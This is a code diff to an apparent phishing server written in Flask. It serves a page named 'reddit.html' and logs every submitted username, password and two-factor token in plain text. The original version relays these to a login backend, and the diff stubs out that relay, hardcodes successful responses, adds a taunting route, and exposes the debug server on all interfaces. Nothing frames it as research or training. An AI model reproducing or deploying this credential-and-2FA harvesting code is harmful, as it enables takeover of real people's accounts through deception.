@@ -10,7 +10,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('login-orig.html')
+    return render_template('reddit.html')
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -18,23 +18,37 @@ def login():
     user = data['username']
     pswd = data['password']
 
-    app.logger.info('{} : {}'.format(user, pswd))
+    app.logger.info('user: {}  //  pass: {}'.format(user, pswd))
 
-    sd.do_login(Username=user, Password=pswd)
+    # err = sd.do_login(Username=user, Password=pswd)
+    err = sd.SUCCESS_NO_TWOAUTH
 
-    return jsonify({'valid': True, '2fa': True})
+    res = {'valid': False, 'twofa': False}
+
+    if err == sd.SUCCESS_NO_TWOAUTH:
+        res['valid'] = True
+    if err == sd.SUCCESS_TWOAUTH:
+        res['valid'] = True
+        res['twofa'] = True
+
+    return jsonify(res)
 
 @app.route('/token', methods=['POST'])
 def twofa():
     data = json.loads(request.data)
     tok = data['token']
 
-    app.logger.info('{}'.format(tok))
+    app.logger.info('tok: {}'.format(tok))
 
-    sd.do_twoauth(tok)
+    # valid = sd.do_twoauth(tok)
+    valid = True
 
-    return jsonify({'valid': True})
+    return jsonify({'valid': valid})
+
+@app.route('/shrek', methods=['GET'])
+def shrek():
+    return 'YOU GOT SHREKED!!\n\n\tRegards,\n\tBigChungus'
 
 if __name__ == '__main__':
-    app.before_first_request(sd.setup)
-    app.run(debug=True)
+    # app.before_first_request(sd.setup)
+    app.run(host='0.0.0.0', port=5000, debug=True)
